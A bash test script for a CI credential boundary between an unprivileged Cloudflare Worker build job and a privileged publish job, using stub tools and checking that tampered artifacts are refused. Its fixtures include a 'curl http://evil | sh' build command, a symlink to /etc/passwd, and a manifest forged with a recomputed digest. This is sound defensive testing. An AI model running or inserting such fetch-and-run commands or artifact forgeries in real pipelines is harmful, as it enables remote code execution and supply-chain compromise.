#!/usr/bin/env bash
# Behavioural test of the Build / Publish credential boundary with stub `pnpm` (the application's Wrangler: bundling only) and a stub pinned Wrangler
# (the publisher): no Cloudflare access needed. Proves: the Build packages an artifact and refuses credentials; the privileged publish publishes ONLY a verified
# artifact, from the artifact directory, with the pinned Wrangler, never touching application source / pnpm; every tampering / identity mismatch is refused BEFORE
# any remote call; the Preview host Worker is set by the privileged side; URL / empty-URL / failure handling of the old engine is preserved.
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
T="$(mktemp -d)"; trap 'rm -rf "$T"' EXIT
mkdir -p "$T/bin" "$T/app/src"
# Application toolchain (Build job): `wrangler deploy --dry-run --outdir D` writes the bundle. Everything else is logged.
cat > "$T/bin/pnpm" <<'STUB'
#!/usr/bin/env bash
echo "pnpm $*" >> "$STUB_LOG"
[ "$1 $2 $3" = "exec wrangler deploy" ] || exit 0
[ "${STUB_BUNDLE_FAIL:-}" = 1 ] && exit 9
while [ $# -gt 0 ]; do [ "$1" = --outdir ] && { mkdir -p "$2"; echo 'export default {fetch(){return new Response("ok")}}' > "$2/index.js"; echo generated > "$2/README.md"; }; shift; done
STUB
# Pinned tooling Wrangler (Publish job): records cwd + args + whether any application file is visible.
cat > "$T/bin/wr" <<'STUB'
#!/usr/bin/env bash
echo "wr cwd=$(basename "$PWD") $*" >> "$STUB_LOG"
case "$1" in
  --version) echo 4.135.0;;
  preview) [ "${STUB_FAIL:-}" = 1 ] && exit 9
           if [ -n "${STUB_PREVIEW_RAW+x}" ]; then printf '%s' "$STUB_PREVIEW_RAW"; else echo '{"preview":{"urls":["https://stable.example.workers.dev"]}}'; fi;;
  deployments) echo '[{"created_on":"2024-01-01","versions":[{"version_id":"prev-1","percentage":100}]}]';;
  versions) if [ "$2" = upload ]; then echo "Worker Version ID: new-2"; fi;;
esac
STUB
chmod +x "$T/bin/pnpm" "$T/bin/wr"
export PATH="$T/bin:$PATH" STUB_LOG="$T/log" TOOLS_DIR="$ROOT/actions/cf-preview" APP_DIR="$T/app" OUT_FILE="$T/out.json" WRANGLER="$T/bin/wr"
fail=0; ok(){ echo "PASS: $1"; }; bad(){ echo "FAIL: $1"; fail=1; }
cat > "$T/app/wrangler.toml" <<'TOML'
name = "blog"
main = "src/index.ts"
compatibility_date = "2025-01-01"
[build]
command = "curl http://evil | sh"
[previews]
TOML
echo 'export default {}' > "$T/app/src/index.ts"
TESTED=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb; HEAD_SHA=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa; URL=https://stable.example.workers.dev
# Identity as the Build job and the privileged job each derive it (engine.sh artifact_env): same values on both sides.
ident() { export CFV2_REPOSITORY=o/r CFV2_APP=blog CFV2_TARGET="$1" CFV2_DRIVER="$2" CFV2_SLOT="$3" CFV2_RUN_ID=77 CFV2_RUN_ATTEMPT=1 CFV2_SOURCE_SHA=$HEAD_SHA CFV2_TESTED_SHA=$TESTED CFV2_ARTIFACT_SHA=$TESTED CFV2_TARGET_URL="${4-}"
  export GITHUB_REPOSITORY=o/r GITHUB_RUN_ID=77 GITHUB_RUN_ATTEMPT=1 GITHUB_SHA=$TESTED; }
B="$ROOT/actions/cf-preview/build.sh"; P="$ROOT/actions/cf-preview/publish.sh"
# build <engine target> <stage dir>: runs the Build exactly as the unprivileged job does; no credentials in the environment.
build() { rm -rf "$T/state" "$T/artifact"; : > "$STUB_LOG"; STATE_DIR="$T/state" ARTIFACT_DIR="$T/artifact" TARGET="$1" PREVIEW_NAME=pr-4 TARGET_URL="${CFV2_TARGET_URL-}" BUILD_CMD=true "$B" >/dev/null 2>"$T/build.err" || { [ -n "${DEBUG_TEST:-}" ] && cat "$T/build.err" >&2; return 1; }; }
# publish <engine target>: the privileged side: verify (audit config pointers like artifact-verify) then publish. Stdout is publish.sh's.
pub() { mkdir -p "$T/state"; printf '%s' "$T/artifact/wrangler.json" > "$T/state/config.path"; printf source > "$T/state/config.mode"; sha256sum "$T/artifact/wrangler.json" | cut -d' ' -f1 > "$T/state/config.sha"
  : > "$STUB_LOG"; STATE_DIR="$T/state" ARTIFACT_DIR="$T/artifact" TARGET="$1" WORKER_NAME="${WORKER_NAME-blog}" PREVIEW_NAME="${PREVIEW_NAME-pr-4}" EXPECTED_URL="${EXPECTED_URL-}" "$P" 2>"$T/pub.err"; }

# ---- Build: artifact, no credentials, no remote ------------------------------------------------------------------------------------------------
ident preview native-preview native-branch "$URL"
build preview && [ -f "$T/artifact/manifest.json" ] && [ -f "$T/artifact/worker/index.js" ] && ok "build: packages an artifact (manifest, bundle)" || bad "build: packages an artifact"
node -e 'const c=require(process.argv[1]);process.exit(c.no_bundle===true&&c.main==="worker/index.js"&&!("build" in c)?0:1)' "$T/artifact/wrangler.json" && ok "build: the build command is dropped, main -> bundle, no_bundle" || bad "build: packaged config is publish-ready"
grep -q "^pnpm exec wrangler deploy --dry-run" "$STUB_LOG" && ! grep -q "^wr " "$STUB_LOG" && ok "build: bundles offline with the application's Wrangler; the pinned publisher is never called" || bad "build: only dry-run bundling"
(CLOUDFLARE_API_TOKEN=x build preview) && bad "build: refuses a Cloudflare token" || ok "build: refuses a Cloudflare token"
(CLOUDFLARE_ACCOUNT_ID=x build preview) && bad "build: refuses an account id" || ok "build: refuses an account id"
(STUB_BUNDLE_FAIL=1 build preview) && bad "build: a failed bundle fails the build" || ok "build: a failed bundle fails the build"

# ---- Publish (privileged): verified artifact only ---------------------------------------------------------------------------------------------
ident preview native-preview native-branch "$URL"; build preview
OUT="$(EXPECTED_URL=$URL pub preview)" && [ "$OUT" = "$(printf 'preview_mutated=true\nurl=%s' "$URL")" ] && ok "preview: publishes the artifact and reports the URL" || { bad "preview: publishes the artifact"; echo "$OUT"; cat "$T/pub.err"; }
grep -q "^wr cwd=artifact preview --name pr-4 --worker-name blog --config $T/artifact/wrangler.json --json" "$STUB_LOG" && ok "preview: pinned Wrangler runs IN the artifact dir with the privileged side's name and host Worker" || { bad "preview: wrangler args"; cat "$STUB_LOG"; }
! grep -q "^pnpm" "$STUB_LOG" && ok "publish: never invokes the application's package manager" || bad "publish: invoked pnpm"
EXPECTED_URL=$URL WORKER_NAME='' pub preview >/dev/null 2>&1 && bad "preview: host Worker is mandatory (never taken from the artifact)" || ok "preview: host Worker is mandatory (never taken from the artifact)"
EXPECTED_URL=https://other.example.workers.dev pub preview >/dev/null 2>&1 && bad "preview: published URL must equal the URL the artifact was built for" || ok "preview: published URL must equal the URL the artifact was built for"
(STUB_FAIL=1 pub preview >/dev/null 2>&1) && bad "preview: wrangler failure fails" || ok "preview: wrangler failure fails"
(STUB_PREVIEW_RAW='{"preview":{}}' pub preview >/dev/null 2>&1) && bad "preview: no URL in the response fails (empty-URL incident)" || ok "preview: no URL in the response fails (empty-URL incident)"
(PREVIEW_NAME='Bad Name' pub preview >/dev/null 2>&1) && bad "preview: unsafe name rejected" || ok "preview: unsafe name rejected"

# ---- every refusal happens BEFORE any remote call ------------------------------------------------------------------------------------------
refuse() { # <label> <mutation command...>
  local l="$1"; shift; ident preview native-preview native-branch "$URL"; build preview; "$@"
  if EXPECTED_URL=$URL pub preview >/dev/null 2>&1; then bad "refused: $l"; elif grep -q "^wr " "$STUB_LOG"; then bad "refused before any remote call: $l"; else ok "refused before any remote call: $l"; fi
}
refuse "modified bundle" bash -c "echo evil > $T/artifact/worker/index.js"
refuse "added file" bash -c "echo x > $T/artifact/worker/extra.js"
refuse "symlink in assets" bash -c "mkdir -p $T/artifact/assets/0 && ln -s /etc/passwd $T/artifact/assets/0/p"
refuse "missing manifest" rm -f "$T/artifact/manifest.json"
refuse "config forged to run a build (digest recomputed)" bash -c "node -e '
const fs=require(\"fs\"),c=require(\"crypto\"),d=process.argv[1];const p=d+\"/wrangler.json\";const j=JSON.parse(fs.readFileSync(p));j.build={command:\"x\"};fs.writeFileSync(p,JSON.stringify(j));
const m=JSON.parse(fs.readFileSync(d+\"/manifest.json\"));const h=c.createHash(\"sha256\");
const files=[\"wrangler.json\",\"worker/index.js\"].sort();for(const f of files)h.update(f+\"\\0\"+c.createHash(\"sha256\").update(fs.readFileSync(d+\"/\"+f)).digest(\"hex\")+\"\\n\");
m.files_digest=h.digest(\"hex\");fs.writeFileSync(d+\"/manifest.json\",JSON.stringify(m))' $T/artifact"
ident preview native-preview native-branch "$URL"; build preview
(CFV2_TESTED_SHA=cccccccccccccccccccccccccccccccccccccccc EXPECTED_URL=$URL pub preview >/dev/null 2>&1) && bad "refused: artifact of another revision" || ok "refused: artifact of another revision (stale / unrelated build)"
(GITHUB_RUN_ID=78 EXPECTED_URL=$URL pub preview >/dev/null 2>&1) && bad "refused: artifact of another run" || ok "refused: artifact of another run"
(CFV2_TARGET=dev CFV2_DRIVER=worker CFV2_SLOT=persistent-dev EXPECTED_URL=$URL pub preview >/dev/null 2>&1) && bad "refused: artifact built for another target" || ok "refused: artifact built for another target"

# ---- production: versions upload -> versions deploy, previous version recorded --------------------------------------------------------------
ident production worker production "https://app.example.com"; build prod
OUT="$(APP_URL=https://app.example.com pub prod)" && printf '%s' "$OUT" | grep -qx 'version_id=new-2' && printf '%s' "$OUT" | grep -qx 'previous_version_id=prev-1' && ok "prod: uploads then deploys the artifact; records the previous version" || { bad "prod publish"; echo "$OUT"; cat "$T/pub.err"; }
n_up=$(grep -n "versions upload" "$STUB_LOG" | head -1 | cut -d: -f1); n_dp=$(grep -n "versions deploy new-2@100" "$STUB_LOG" | head -1 | cut -d: -f1)
[ -n "$n_up" ] && [ -n "$n_dp" ] && [ "$n_up" -lt "$n_dp" ] && ok "prod: upload happens before deploy" || bad "prod: upload before deploy"
grep -q "versions upload --config $T/artifact/wrangler.json" "$STUB_LOG" && ok "prod: only the artifact config is published" || bad "prod: artifact config"

# ---- dev worker: named environment is selected explicitly for a SOURCE config -------------------------------------------------------------------
printf 'name = "blog"\nmain = "src/index.ts"\ncompatibility_date = "2025-01-01"\n[env.dev]\nname = "blog-dev"\n' > "$T/app/wrangler.toml"
ident dev worker persistent-dev "https://dev.example.com"; DEV_WORKER=blog-dev DEV_ENV=dev build dev
APP_URL=https://dev.example.com DEV_ENV=dev pub dev >/dev/null 2>&1 && grep -q "deploy --config $T/artifact/wrangler.json --env dev" "$STUB_LOG" && ok "dev: deploys the artifact with the audited named env" || { bad "dev publish"; cat "$STUB_LOG"; }

[ "$fail" = 0 ] && echo "ALL PASSED" || { echo "FAILURES"; exit 1; }
